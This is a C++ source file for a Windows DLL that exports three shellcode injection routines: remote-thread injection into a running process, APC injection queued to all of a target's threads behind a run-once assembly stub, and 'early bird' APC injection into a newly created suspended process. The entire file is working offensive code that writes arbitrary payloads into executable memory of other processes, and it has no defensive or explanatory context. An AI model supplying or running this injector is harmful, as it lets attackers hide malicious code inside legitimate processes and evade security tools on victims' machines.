// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdio.h>
#include <tlhelp32.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL QueueApcToProcess(DWORD targetPid, LPVOID payloadAddr) {
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    int queuedCount = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (te32.th32OwnerProcessID == targetPid) {
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);

            if (hThread != NULL) {
                if (QueueUserAPC((PAPCFUNC)payloadAddr, hThread, 0)) {
                    queuedCount++;
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);

    return (queuedCount > 0);
}

extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned char* payload, unsigned int length)
{
    HANDLE hProcess;
    HANDLE hThread;
    PVOID remoteBuffer;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
        return -1;

    remoteBuffer = VirtualAllocEx(hProcess, NULL, length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(hProcess);
        return -2;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, length, NULL)) {
        CloseHandle(hProcess);
        return -3;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProcess);
        return -4;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, unsigned char* payload, SIZE_T length) {
    HANDLE hProcess;
    LPVOID blockMem;
    SIZE_T bytesWritten;

    unsigned char stub[] = {
        0x4C, 0x8D, 0x05, 0xF1, 0xFF, 0xFF, 0xFF,   // lea r8, [rip - 0x0F]
        0x31, 0xC0,                                   // xor eax, eax
        0xBA, 0x01, 0x00, 0x00, 0x00,                 // mov edx, 1
        0xF0, 0x41, 0x0F, 0xB1, 0x10,                 // lock cmpxchg [r8], edx
        0x75, 0x02,                                   // jnz +2 (to ret)
        0xEB, 0x01,                                   // jmp +1 (to payload)
        0xC3                                          // ret
    };

    SIZE_T flagSize = 8;
    SIZE_T stubSize = sizeof(stub);
    SIZE_T totalSize = flagSize + stubSize + length;

    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        return -1;
    }

    blockMem = VirtualAllocEx(
        hProcess,
        NULL,
        totalSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (blockMem == NULL) {
        CloseHandle(hProcess);
        return -1;
    }

    LONG64 zero = 0;
    if (!WriteProcessMemory(hProcess, blockMem, &zero, sizeof(zero), &bytesWritten)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    LPVOID stubAddr = (BYTE*)blockMem + flagSize;
    if (!WriteProcessMemory(hProcess, stubAddr, stub, stubSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    LPVOID payloadAddr = (BYTE*)stubAddr + stubSize;
    if (!WriteProcessMemory(hProcess, payloadAddr, payload, length, &bytesWritten)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    if (bytesWritten != length) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    if (!QueueApcToProcess(pid, stubAddr)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    CloseHandle(hProcess);
    return 0;
}

extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targetExe, unsigned char* payload, SIZE_T length) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    LPVOID blockMem;
    SIZE_T bytesWritten;

    si.cb = sizeof(si);

    if (!CreateProcessA(
        targetExe,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return -1;
    }

    blockMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (blockMem == NULL) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -2;
    }

    if (!WriteProcessMemory(pi.hProcess, blockMem, payload, length, &bytesWritten)) {
        VirtualFreeEx(pi.hProcess, blockMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -3;
    }

    if (bytesWritten != length) {
        VirtualFreeEx(pi.hProcess, blockMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -4;
    }

    if (!QueueUserAPC((PAPCFUNC)blockMem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, blockMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -5;
    }

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

